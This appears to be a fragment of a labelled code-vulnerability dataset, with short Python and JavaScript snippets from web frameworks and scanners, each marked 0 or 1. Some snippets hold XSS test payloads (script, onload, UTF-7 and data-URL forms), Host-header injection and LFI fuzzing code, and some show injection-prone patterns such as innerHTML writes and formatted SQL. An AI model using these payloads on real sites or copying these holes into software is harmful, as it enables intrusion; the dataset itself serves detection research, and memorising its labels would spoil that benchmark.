df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype", "label": 0}, {"snippet_id": 44663, "code": "() workflows=[] if node['widgetType']=='subworkflow-widget': workflows=_get_workflows(request.user) response['status']=0 response['properties']=properties response['workflows']=workflows return HttpResponse", "label": 0}, {"snippet_id": 1380, "code": " 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'], 'impact': data['impact'], 'name': data['alert']", "label": 0}, {"snippet_id": 23277, "code": "', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\")", "label": 0}, {"snippet_id": 34361, "code": "=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children(), key, limit=limit) \t\t\tif filters: \t\t\t\tif isinstance(filters, dict): \t\t\t\t\tvalue=_filter(self.__dict__.get(key,[]", "label": 0}, {"snippet_id": 47599, "code": " name: \")) f.add_content(TextField(name='display_name')) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', minimum=0)) f.add_content(PlainText('Number of allowed reservations: '", "label": 0}, {"snippet_id": 6287, "code": "') @property def syslog_debug(self): \"\"\" Set to True to log debug messages to syslog(also requires syslog_socket)(boolean). \"\"\" return self.config.getboolean(self.section, 'syslog_debug') @property def", "label": 0}, {"snippet_id": 51481, "code": "'dashboard.internet_nl_dashboard', 'django_otp', 'django_otp.plugins.otp_static', 'django_otp.plugins.otp_totp', 'two_factor', ] try: if not os.environ.get('COMPRESS', False): import django_uwsgi INSTALLED_APPS", "label": 0}, {"snippet_id": 27509, "code": "): \"\"\"Make the switch account url.\"\"\" return '/login?' +urllib.parse.urlencode({'dest': dest_url}) def make_logout_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/logout?' +urllib.parse.urlencode", "label": 0}, {"snippet_id": 4342, "code": " payload\"\"\" def __init__(self, url=\"\"): \"\"\" url: xss payload url \"\"\" super(XSS, self).__init__() self.url=url @staticmethod def alterTest(self, p=False): return \"<script>alert(/xss/)</script>\" def img(self)", "label": 1}, {"snippet_id": 21312, "code": "<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter", "label": 1}, {"snippet_id": 38980, "code": " \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): \t\td=frappe._dict() \t\tfor fieldname in self.meta.get_valid_columns(): \t\t\td[fieldname]=self.get(fieldname) \t\t\t \t\t\tif not", "label": 0}, {"snippet_id": 11938, "code": " wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())),", "label": 0}, {"snippet_id": 46099, "code": " query['qd']=request.GET.get('qd') template='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': json.dumps(query), 'initial': json.dumps", "label": 1}, {"snippet_id": 33754, "code": "=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{", "label": 0}, {"snippet_id": 46970, "code": "'-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter(post_id=self.id).count() @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id}', '{self", "label": 0}, {"snippet_id": 19854, "code": ") self.test_dir=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir ", "label": 0}, {"snippet_id": 29479, "code": "=ssh_connect(serv) \tfor command in commands: \t\tstdin, stdout, stderr=ssh.exec_command(command, get_pty=True) \t\tif not stderr.read(): \t\t\treturn True \t\telse: \t\t\treturn False \tssh.close() \t\t def show_log(stdout", "label": 0}, {"snippet_id": 27257, "code": "!=2: print \"program[url]\" exit() url=sys.argv[1] if url.find(\"http\") !=0: print \"[-] Invalid target\" exit() m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M) if m: host=m.group(2) else: print \"[", "label": 1}, {"snippet_id": 37239, "code": "\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') +'/' +self.scrub(self.title) \tdef get_feed(self", "label": 0}, {"snippet_id": 48097, "code": ".chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter width *", "label": 0}, {"snippet_id": 5581, "code": "\"0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">\"\"\", \"\"\"<head><meta http-equiv=\"content-type\" content=\"text/html; charset=utf-7\"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT", "label": 0}, {"snippet_id": 1983, "code": "=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers) decoded_payload=xss_payload_decode(payload) if", "label": 0}, {"snippet_id": 23026, "code": ", name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$", "label": 0}, {"snippet_id": 45292, "code": ".description, extra='coordinator2') if coordinator_data['properties']['workflow']: dependencies=Document2.objects.filter(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in", "label": 0}, {"snippet_id": 35225, "code": "(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"\"\" \t\tdef get_msg", "label": 0}, {"snippet_id": 52962, "code": "(smart_str(e)) workflows=[dict([('uuid', d.content_object.uuid),('name', d.content_object.name)]) for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] if coordinator_id and not", "label": 0}, {"snippet_id": 31343, "code": "\t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t", "label": 0}, {"snippet_id": 15403, "code": " test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files() msg=colorize('green', \"Checking for mongo, memchache, and mysql...\") print msg bokchoy_utils", "label": 0}, {"snippet_id": 45982, "code": " card-widget span12\"}]}, {\"widgets\":[ {\"size\":12,\"name\":\"Grid Results\",\"widgetType\":\"resultset-widget\", \"id\":\"14023aef-b233-9420-96c6-15d48293532b\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":", "label": 0}, {"snippet_id": 35128, "code": " \t\t \t\t \t\tif \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname", "label": 0}, {"snippet_id": 33916, "code": ": \t\t\tconditions.append('t1.blogger=\"%s\"' % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt", "label": 0}, {"snippet_id": 34734, "code": "[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d", "label": 0}, {"snippet_id": 20507, "code": " print msg sh( 'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf", "label": 0}, {"snippet_id": 21291, "code": " 'staticbook.views.index_shifted'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/", "label": 1}, {"snippet_id": 41597, "code": ".utils.password import get_decrypted_password, set_encrypted_password _classes={} def get_controller(doctype): \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe", "label": 0}, {"snippet_id": 34005, "code": ")=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and ", "label": 0}, {"snippet_id": 4414, "code": ":200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s", "label": 0}, {"snippet_id": 15300, "code": "=Env.BOK_CHOY_DIR / kwargs.get('test_dir', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self", "label": 0}, {"snippet_id": 32377, "code": "(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread", "label": 0}, {"snippet_id": 9592, "code": " if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE", "label": 0}, {"snippet_id": 23840, "code": ".format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)) def test_spec_with_draft_default_store(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec, default_store='draft')", "label": 0}, {"snippet_id": 35034, "code": " \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t\t\t\traise \t\tself", "label": 0}, {"snippet_id": 19773, "code": " set, skip various set-up tasks(e.g., collectstatic) serversonly -prepare and run the necessary servers, only stopping when interrupted with Ctrl-C testsonly -assume servers are running(as per above) and", "label": 0}, {"snippet_id": 22274, "code": "/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset", "label": 0}, {"snippet_id": 37451, "code": " get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog", "label": 0}, {"snippet_id": 43775, "code": " df and df.print_hide is not None: \t\t\t\tprint_hide=df.print_hide \t\t\telif meta_df: \t\t\t\tprint_hide=meta_df.print_hide \t\treturn print_hide \tdef in_format_data(self, fieldname): \t\t\"\"\"Returns True if shown via", "label": 0}, {"snippet_id": 8106, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'", "label": 0}, {"snippet_id": 18932, "code": "='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 6984, "code": ".change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r", "label": 0}, {"snippet_id": 30579, "code": "%(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput", "label": 0}, {"snippet_id": 51835, "code": "'color', }, }, 'formatters':{ 'debug':{ 'format': '%(asctime)s\\t%(levelname)-8s -%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter', 'format': '", "label": 0}, {"snippet_id": 18615, "code": ".users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 49794, "code": "{setTimeout(` socket.emit('sendMSG','Connection Established.') `,1000) } catch{} socket.on('getMSG',function(data){ document.getElementById(\"history\").innerHTML+=\"<br><font size=3 color=black>[\"+data+\"", "label": 1}, {"snippet_id": 39756, "code": " first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[ \t\t\t\t\t_df for _df in self.meta.get_fields_to_fetch(df.fieldname) \t\t\t\t\tif \t\t\t\t\t\tnot _df.get('fetch_if_empty') \t\t\t\t\t", "label": 0}, {"snippet_id": 41529, "code": ".format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\"", "label": 0}, {"snippet_id": 5902, "code": "/>' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee", "label": 0}, {"snippet_id": 28760, "code": "\">') \t\timport sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='", "label": 0}, {"snippet_id": 28949, "code": "=get_config_var('main', 'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" ", "label": 0}, {"snippet_id": 48177, "code": "] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add", "label": 0}, {"snippet_id": 10802, "code": " self.extra_args=kwargs.get('extra_args', '') self.har_dir=self.log_dir / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs", "label": 0}, {"snippet_id": 15908, "code": "=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8003/auto_auth?{}\\\"\".format(lms_params)) def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self", "label": 0}, {"snippet_id": 27047, "code": " range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=lfi else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)):", "label": 0}, {"snippet_id": 7894, "code": " 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list", "label": 0}, {"snippet_id": 54023, "code": "\") sys.exit() try: import bane except: print(\"You need to install: bane\") sys.exit() class sc(threading.Thread): def run(self): global stop ti=time.time() print(\"=\"*25) print(\"\\n[*]Target:{}\\n[*]Date:{", "label": 0}, {"snippet_id": 33069, "code": " else: ul_with_the_desired_toc_entries=toc_ul toc_node.remove(toc_ul) contents=ElementTree.SubElement(toc_node, 'h2') contents.text='Contents' contents.tail='\\n' toc_aux=ElementTree.SubElement(toc_node, ", "label": 0}, {"snippet_id": 19678, "code": " Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver", "label": 0}, {"snippet_id": 848, "code": " payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list", "label": 1}, {"snippet_id": 24351, "code": ") and run tests with no setup or cleaning of environment test_spec -when set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft", "label": 0}, {"snippet_id": 39639, "code": "\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", ", "label": 0}, {"snippet_id": 38939, "code": "=get_controller(value[\"doctype\"])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif", "label": 0}, {"snippet_id": 34755, "code": " isinstance(d[fieldname],(datetime.datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not", "label": 0}, {"snippet_id": 6994, "code": "'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change", "label": 0}, {"snippet_id": 2191, "code": "\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1", "label": 0}, {"snippet_id": 16860, "code": ">[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/", "label": 0}, {"snippet_id": 54497, "code": " django.template import RequestContext from django.shortcuts import Http404, redirect, render, render_to_response from django.views.generic import ListView, DetailView from django.views.generic.edit import", "label": 0}, {"snippet_id": 3196, "code": " xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key", "label": 0}, {"snippet_id": 31120, "code": ")) \tif error: \t\tprint('error: '+error) \t\tsys.exit() \tfunct.upload(slave, tmp_config_path, script) \t \tfunct.ssh_command(master,[\"sudo chmod +x \"+tmp_config_path+script, tmp_config_path+script+\" MASTER \"", "label": 0}, {"snippet_id": 21185, "code": ">[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course", "label": 0}, {"snippet_id": 21148, "code": ")$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url", "label": 0}, {"snippet_id": 39083, "code": "\t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime", "label": 0}, {"snippet_id": 14893, "code": "\"\" process_count=2 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes={procs} --no-color --process-timeout=1200\".format( repo_dir", "label": 0}, {"snippet_id": 4083, "code": "(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url", "label": 0}, {"snippet_id": 2236, "code": " def xss_get_uri(url,method,headers,body,scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query", "label": 0}, {"snippet_id": 11440, "code": " staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url", "label": 0}, {"snippet_id": 38221, "code": " in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog", "label": 0}, {"snippet_id": 11682, "code": ", django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done')", "label": 0}, {"snippet_id": 44440, "code": " request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job[", "label": 0}, {"snippet_id": 43286, "code": " key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value", "label": 0}, {"snippet_id": 1160, "code": " request from flask import Flask from apiscan import scan_single_api from flask import jsonify from pymongo import MongoClient from utils.vulnerabilities import alerts app=Flask(__name__,template_folder='", "label": 1}, {"snippet_id": 53713, "code": "/config.yml').render( APPLICATION_NAME=application_name, DEFAULT_REGION=default_region ) def write_eb_config(dest, application_name, default_region): contents=make_eb_config(application_name, default_region)", "label": 0}, {"snippet_id": 53639, "code": ", request.jt, properties).deploy() deployment_mapping['wf_%s_dir' % i]=request.fs.get_hdfs_path(wf_dir) coordinator=Coordinator(document=coord) coord_dir=Submission(request.user, coordinator, request.fs", "label": 0}, {"snippet_id": 35222, "code": ".fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"\"Get mandatory fields that do not have any values\"", "label": 0}, {"snippet_id": 31282, "code": "=cookie.get('uuid')\t \tservers=sql.select_servers_metrics(user_id.value) \tservers=sorted(servers) \t \tp={} \tfor serv in servers: \t\tserv=serv[0] \t\tp[serv]={} \t\tmetric=sql.select_metrics(serv) \t\tmetrics={} ", "label": 0}, {"snippet_id": 16305, "code": ".static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id'", "label": 0}, {"snippet_id": 43497, "code": ".doctype, self.name, new_password, df.fieldname) \t\t\t\t \t\t\t\tself.set(df.fieldname, '*'*len(new_password)) \tdef get_password(self, fieldname='password', raise_exception=True): \t\tif self.get(fieldname) and", "label": 0}, {"snippet_id": 30669, "code": "+viewlog, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map(serv) \t if form", "label": 0}, {"snippet_id": 10540, "code": "}demo_course.tar.gz'.format(targz=suite.tar_gz_file, dir=suite.imports_dir)), call( 'tar zxf{dir}demo_course.tar.gz -C{dir}'.format(dir=suite.imports_dir)), ]) def test_generate_html_reports(self): suite", "label": 0}, {"snippet_id": 51181, "code": "(CrontabSchedule, IECrontabSchedule) class DashboardUserInline(admin.StackedInline): model=DashboardUser can_delete=False verbose_name_plural='Dashboard Users' class UserResource(resources.ModelResource)", "label": 0}, {"snippet_id": 6715, "code": " in simple templating of login.html. \"\"\" return self.config.get(self.section, 'password_reset_link') @property def default_language(self): \"\"\" Default language code to use when looking for web pages('en", "label": 0}, {"snippet_id": 25845, "code": " ) elif q.type==Question.TYPE_DATE: field=forms.DateField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).date() if initial and initial.answer", "label": 0}, {"snippet_id": 29300, "code": "=\"save\": \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf\"] \t\telse: \t\t\tcommands=[ \"sudo mv -f \" +tmp_file +\" /etc/keepalived/keepalived.conf && sudo systemctl restart keepalived", "label": 0}, {"snippet_id": 26998, "code": " hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host ", "label": 0}, {"snippet_id": 32489, "code": "'[^-a-zA-Z0-9]', '_', value) value=value.replace(u' ', u'-') value=re.sub(r'([-_])[-_]+', r'\\1', value) return value class Server(SocketServer.TCPServer): def __init__(self, server_address, top_level):", "label": 0}, {"snippet_id": 37741, "code": ", %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post", "label": 0}, {"snippet_id": 6909, "code": ".config.get(self.section, 'vccs_url') @property def insecure_cookies(self): \"\"\" Set to True to NOT set HTTP Cookie 'secure' flag(boolean). \"\"\" return self.config.getboolean(self.section, 'insecure_cookies", "label": 0}, {"snippet_id": 1149, "code": "/') from flask import Flask,render_template from flask import Response,make_response from flask import request from flask import Flask from apiscan import scan_single_api from flask import jsonify from", "label": 1}, {"snippet_id": 10554, "code": " ]) def test_generate_html_reports(self): suite=Pa11yCrawler('') suite.generate_html_reports() self._mock_sh.assert_has_calls([ call( 'pa11ycrawler json-to-html --pa11ycrawler-reports-dir={}'.format(suite", "label": 0}, {"snippet_id": 45279, "code": ", owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description, extra='coordinator2') if coordinator_data['properties", "label": 0}, {"snippet_id": 27566, "code": "\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403", "label": 0}, {"snippet_id": 34757, "code": ".datetime, datetime.time, datetime.timedelta)): \t\t\t\t\td[fieldname]=str(d[fieldname]) \t\treturn d \tdef init_valid_columns(self): \t\tfor key in default_fields: \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__", "label": 0}, {"snippet_id": 33087, "code": " from google.appengine.api import users as gae_users from components import auth from components import config as config_api from components import decorators from components import endpoints_webapp2 from", "label": 1}, {"snippet_id": 37726, "code": "\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name \t\t%(condition)s \t\torder by published_on desc, name asc \t\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\"", "label": 0}, {"snippet_id": 8232, "code": "/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider", "label": 0}, {"snippet_id": 46515, "code": "'is_mobile'): massaged_collection['absoluteUrl']=reverse('search:index_m') +'?collection=%s' % collection.id massaged_collection['isOwner']=collection.doc.get().can_write(request.user) collections.append", "label": 0}, {"snippet_id": 38785, "code": " \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list) and not as_value: \t\t\tself.__dict__[key]=[] \t\t\tself.extend(key, value) \t\telse: \t\t\tself.__dict__[key]=value \tdef delete_key(self,", "label": 0}, {"snippet_id": 5863, "code": " +=''' %s=\"console.log('%s %s')\" ''' %(e, t, e) s +='>%s</%s>\\n' %(t, t) return cls.htmlTemplate % s @classmethod def acmehttp01(cls, url): return url +'/.well-known/acme-challenge/?<h1>hi' def img(self", "label": 1}, {"snippet_id": 45300, "code": "(type='oozie-workflow2', uuid=coordinator_data['properties']['workflow']) for doc in dependencies: doc.doc.get().can_read_or_exception(request.user) coordinator_doc.dependencies=dependencies coordinator_doc", "label": 0}, {"snippet_id": 32227, "code": ".insert(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default", "label": 0}, {"snippet_id": 41443, "code": "\t\t\t\t\tand reference_doctype='Blog Post' \t\t\t\t\t\tand reference_name=t1.name) as comments \t\tfrom `tabBlog Post` t1, `tabBlogger` t2 \t\twhere ifnull(t1.published,0)=1 \t\tand t1.blogger=t2.name 